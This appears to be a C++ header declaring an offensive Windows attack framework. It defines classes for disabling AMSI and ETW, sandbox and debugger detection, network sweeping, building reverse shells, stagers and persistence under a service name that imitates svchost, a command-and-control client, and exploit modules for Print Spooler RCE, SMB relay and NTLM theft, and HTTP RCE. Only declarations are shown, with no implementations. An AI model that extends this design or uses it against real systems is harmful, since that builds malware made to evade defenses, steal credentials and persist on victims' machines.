#pragma once

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <shlwapi.h>
#include <cryptuiapi.h>
#include <userenv.h>
#include <string>
#include <vector>
#include <map>
#include <memory>
#include <functional>
#include <fstream>
#include <iostream>
#include <sstream>
#include <array>

namespace cveh {

    struct TargetSpec {
        std::string host;
        uint16_t port = 445;
        std::string protocol = "smb";
        std::string username;
        std::string password;
        std::map<std::string, std::string> tags;
    };

    struct ProbeResult {
        std::string host;
        bool reachable = false;
        bool smb = false;
        bool http = false;
        bool msrpc = false;
        bool winrm = false;
        std::string banner;
    };

    struct PayloadConfig {
        std::string output_path;
        std::string c2_host;
        uint16_t c2_port = 443;
        std::string persistence_name = "svchostsvc";
        std::string command = "cmd /c whoami";
        bool bind_admin = false;
        bool add_persistence = true;
        bool use_http2 = false;
    };

    class Evasion {
    public:
        static void patch_etw();
        static void patch_amsi();
        static void patch_wldp();
        static void indirect_syscall_setup();
        static void sleep_obfuscated(DWORD ms);
        static std::string xor_cipher(const std::string& input, const std::string& key);
        static std::string xor_decrypt(const std::string& input, const std::string& key);
        static void hide_console();
        static bool check_vm();
        static bool check_debugger();
    };

    class Scanner {
    public:
        static std::vector<ProbeResult> sweep(const std::vector<TargetSpec>& targets);
        static std::vector<TargetSpec> parse_targets_from_file(const std::string& path);
    };

    class PayloadFactory {
    public:
        static std::string build_reverse_shell(const PayloadConfig& cfg);
        static std::string build_stager(const PayloadConfig& cfg);
        static std::string build_persistence(const PayloadConfig& cfg);
        static bool write_payload_to_disk(const std::string& payload, const std::string& output_path);
    };

    class C2Client {
    public:
        C2Client(const std::string& host, uint16_t port, bool tls = true);
        ~C2Client();
        bool connect();
        bool send_heartbeat();
        bool send_result(const std::string& json_blob);
        std::string recv_response();
        std::string encode_json(const std::string& s);
    private:
        std::string host_;
        uint16_t port_;
        bool tls_ = true;
        SOCKET sock_ = INVALID_SOCKET;
    };

    class ExploitModule {
    public:
        virtual ~ExploitModule() = default;
        virtual std::string name() const = 0;
        virtual bool supports(const TargetSpec& target) const = 0;
        virtual std::string execute(const TargetSpec& target, const PayloadConfig& cfg) = 0;
    };

    class PrintSpoolerRCE : public ExploitModule {
    public:
        std::string name() const override { return "Windows Print Spooler RCE"; }
        bool supports(const TargetSpec& target) const override;
        std::string execute(const TargetSpec& target, const PayloadConfig& cfg) override;
    };

    class SMBRelayModule : public ExploitModule {
    public:
        std::string name() const override { return "SMB Relay / NTLM Theft"; }
        bool supports(const TargetSpec& target) const override;
        std::string execute(const TargetSpec& target, const PayloadConfig& cfg) override;
    };

    class HttpRCEProbe : public ExploitModule {
    public:
        std::string name() const override { return "HTTP RCE Probe"; }
        bool supports(const TargetSpec& target) const override;
        std::string execute(const TargetSpec& target, const PayloadConfig& cfg) override;
    };

    class Framework {
    public:
        void add_module(std::unique_ptr<ExploitModule> module);
        std::string run(const std::vector<TargetSpec>& targets, const PayloadConfig& cfg);
    private:
        std::vector<std::unique_ptr<ExploitModule>> modules_;
    };

    std::string json_quote(const std::string& s);
    std::string build_status_json(const std::string& module_name, bool success, const std::string& details);
}
